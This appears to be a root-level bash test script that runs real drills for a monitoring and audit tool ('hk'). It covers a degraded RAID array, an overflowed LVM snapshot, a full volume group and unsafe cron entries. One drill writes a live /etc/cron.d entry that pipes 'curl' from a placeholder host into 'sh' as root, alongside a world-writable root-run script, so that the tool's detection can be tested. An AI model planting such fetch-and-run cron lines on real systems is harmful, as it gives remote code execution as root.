#!/usr/bin/env bash
# REAL drills (root + loop devices): hk must notice a real degraded md-RAID, a real invalidated LVM snapshot,
# a nearly full VG, and a real world-writable cron script on the live system - then fix/roll back the cron one.
# STORAGE_NO_UDEV=1 for containers (no udevd).
set -uo pipefail
cd "$(dirname "$0")/.."
[[ $EUID -eq 0 ]] || { echo "needs root"; exit 77; }
export NO_COLOR=1 HK_STATE; T=$(mktemp -d); HK_STATE="$T/state"; HK="$PWD/hk"
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); printf '  ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf '  FAIL %s\n' "$1"; }
assert() { if eval "$2"; then ok "$1"; else bad "$1   [$2]"; fi; }
LOOPS=(); MNTS=()
cleanup() { set +e; for m in "${MNTS[@]}"; do umount -l "$m" 2>/dev/null; done
  vgchange -an vgh >/dev/null 2>&1; vgremove -ff vgh >/dev/null 2>&1
  [[ -e /dev/md/hk0 ]] && mdadm --stop /dev/md/hk0 >/dev/null 2>&1
  for l in "${LOOPS[@]}"; do pvremove -ff -y "$l" >/dev/null 2>&1; losetup -d "$l" 2>/dev/null; done
  rm -f /etc/cron.d/hk-drill /opt/hk-drill-backup.sh /etc/cron.allow.hkdrill; rm -rf "$T"; }
trap cleanup EXIT
mkloop() { truncate -s "$2" "$T/$1.img"; local l; l=$(losetup -f --show "$T/$1.img") || return 1; LOOPS+=("$l"); echo "$l"; }
if [[ -n ${STORAGE_NO_UDEV:-} ]]; then
  mkdir -p /etc/lvm/conf.d; printf 'activation {\n udev_sync = 0\n udev_rules = 0\n verify_udev_operations = 0\n}\ndevices {\n use_devicesfile = 0\n}\n' > /etc/lvm/conf.d/hk-ci.conf
  grep -q 'conf.d' /etc/lvm/lvm.conf 2>/dev/null || printf 'activation {\n udev_sync = 0\n udev_rules = 0\n}\n' >> /etc/lvm/lvm.conf
fi
echo "lvm: $(lvm version 2>&1 | head -1 | xargs)"; mdadm --version 2>&1 | head -1
export HK_CONSECUTIVE=1 HK_ALERT_CHANNELS=stdout

echo "== real md-RAID1"
R1=$(mkloop r1 120M) && R2=$(mkloop r2 120M) && R3=$(mkloop r3 120M) || { echo "no loop devices here"; exit 77; }
mdadm --create /dev/md/hk0 --level=1 --raid-devices=2 --metadata=1.2 --run --force "$R1" "$R2" >/dev/null 2>&1 || { bad "mdadm --create"; exit 1; }
MD=$(readlink -f /dev/md/hk0); mdadm --wait "$MD" >/dev/null 2>&1; sleep 1
assert "STO-003 passes on a healthy real array"            '$HK audit --only STO-003 --format json | grep -q "\"status\":\"PASS\""'
rm -f "$HK_STATE/monitor.state"; $HK monitor once >/dev/null 2>&1
mdadm "$MD" --fail "$R2" >/dev/null 2>&1; sleep 1
out=$($HK audit --only STO-003 2>&1)
assert "STO-003 FAILS after a real member failure"         'grep -q "FAIL" <<<"$out" && grep -qE "degraded 1/2|failed-member" <<<"$out"'
out=$(HK_ALERT_CHANNELS=stdout $HK monitor once 2>&1)
assert "hk monitor alerts CRIT raid_degraded on the real array" 'grep -q "CRIT: raid_degraded = 1" <<<"$out"'
mdadm "$MD" --remove "$R2" >/dev/null 2>&1; mdadm "$MD" --add "$R3" >/dev/null 2>&1; mdadm --wait "$MD" >/dev/null 2>&1; sleep 1
out=$($HK monitor once 2>&1)
assert "RECOVERED notice after the real rebuild"           'grep -q "RECOVERED: raid_degraded" <<<"$out"'
assert "STO-003 passes again"                              '$HK audit --only STO-003 --format json | grep -q "\"status\":\"PASS\""'
mdadm --stop "$MD" >/dev/null 2>&1

echo "== real LVM: snapshot overflow + full VG"
L1=$(mkloop pv1 300M)
pvcreate -y "$L1" >/dev/null 2>&1 && vgcreate vgh "$L1" >/dev/null 2>&1 && lvcreate -y -n data -L 100M vgh >/dev/null 2>&1 || { bad "lvm setup"; exit 1; }
mkfs.ext4 -q /dev/vgh/data; mkdir -p "$T/m"; mount /dev/vgh/data "$T/m"; MNTS+=("$T/m")
assert "STO-004 passes on a fresh VG"                      '$HK audit --only STO-004 --format json | grep -q "\"status\":\"PASS\""'
lvcreate -y -s -n snap -L 8M vgh/data >/dev/null 2>&1
dd if=/dev/urandom of="$T/m/big" bs=1M count=40 conv=fsync 2>/dev/null; sync
out=$($HK audit --only STO-004 2>&1)
assert "STO-004 FAILS when the snapshot really overflowed" 'grep -q "FAIL" <<<"$out" && grep -qE "invalid-snapshot|100%full" <<<"$out"'
rm -f "$HK_STATE/monitor.state"; out=$($HK monitor once 2>&1)
assert "monitor: lv_snap CRIT on the real snapshot"        'grep -q "CRIT: lv_snap:vgh/snap = 100" <<<"$out"'
lvremove -f vgh/snap >/dev/null 2>&1
lvcreate -y -n filler -l 100%FREE vgh >/dev/null 2>&1
out=$($HK audit --only STO-004 2>&1)
assert "STO-004 FAILS when the VG is 100%% allocated"       'grep -q "VG:vgh" <<<"$out"'
rm -f "$HK_STATE/monitor.state"; out=$($HK monitor once 2>&1)
assert "monitor: vg_used CRIT"                             'grep -q "CRIT: vg_used:vgh = 100" <<<"$out"'
umount "$T/m"; vgchange -an vgh >/dev/null 2>&1; vgremove -ff vgh >/dev/null 2>&1

echo "== live cron hygiene (/etc/cron.d on this machine)"
mkdir -p /etc/cron.d /opt; printf '#!/bin/sh\ntrue\n' > /opt/hk-drill-backup.sh; chmod 777 /opt/hk-drill-backup.sh
printf '*/5 * * * * root /opt/hk-drill-backup.sh\n0 3 * * * root curl -s http://example.invalid/x | sh\n' > /etc/cron.d/hk-drill; chmod 644 /etc/cron.d/hk-drill
out=$($HK audit --only CRN-001,CRN-002 2>&1)
assert "CRN-001 sees the world-writable script run by root" 'grep -q "hk-drill-backup.sh(777,as root)" <<<"$out"'
assert "CRN-002 sees curl | sh in /etc/cron.d"             'grep -q "hk-drill(download|sh)" <<<"$out"'
$HK fix --apply CRN-001 >"$T/fix.log" 2>&1
assert "hk fix CRN-001 really removes world-write"          '[[ $(stat -c %a /opt/hk-drill-backup.sh) == 775 ]]'
tx=$($HK tx list | tail -1 | awk '{print $1}'); $HK rollback "$tx" >/dev/null 2>&1
assert "rollback restores the original mode"               '[[ $(stat -c %a /opt/hk-drill-backup.sh) == 777 ]]'

echo; echo "passed: $PASS   failed: $FAIL"
(( FAIL == 0 ))
